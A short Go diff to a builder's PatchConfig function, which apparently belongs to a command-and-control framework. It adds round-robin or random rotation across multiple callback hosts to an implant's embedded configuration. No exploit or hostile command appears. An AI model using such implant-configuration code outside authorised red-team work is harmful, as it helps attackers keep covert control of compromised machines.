@@ -510,8 +510,29 @@ func (b *Builder) PatchConfig() []byte {
             logger.Error("Failed convert Port string to int: " + err.Error())
         }
 
-        DemonConfig.AddString(Config.Config.Hosts)
+        switch Config.Config.HostRotation {
+        case "round-robin":
+            DemonConfig.AddInt(0)
+            break
+
+        case "random":
+            DemonConfig.AddInt(1)
+            break
+
+        default:
+            // default is random
+            DemonConfig.AddInt(1)
+            break
+        }
+
+        DemonConfig.AddInt(len(Config.Config.Hosts))
+        for _, headers := range Config.Config.Hosts {
+            logger.Debug(headers)
+            DemonConfig.AddString(headers)
+        }
+
         DemonConfig.AddInt(Port)
+
         if Config.Config.Secure {
             DemonConfig.AddInt(win32.TRUE)
         } else {
